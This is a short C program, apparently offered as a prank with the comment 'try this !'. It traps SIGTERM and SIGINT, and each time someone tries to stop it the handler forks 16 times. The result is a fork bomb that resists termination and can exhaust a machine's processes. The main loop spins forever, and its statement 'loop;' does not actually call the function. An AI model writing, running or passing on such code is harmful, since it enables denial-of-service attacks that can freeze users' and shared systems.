#include <stdlib.h>
#include <signal.h>
#include <unistd.h> 

/* try this ! */
  
void catch(int sn) {
    int i;
    signal(SIGTERM, catch);
    signal(SIGINT, catch);
    for(i=0;i<16;i++) fork();
}

void loop() {
    int a=0;
    int b=31337;
    int c;
    for(a=0;a<65525;a++) { c = (3 * a + b) % 42; }
}

int main() {
    signal(SIGTERM, catch);
    signal(SIGINT, catch);
    for (;;) loop;
}
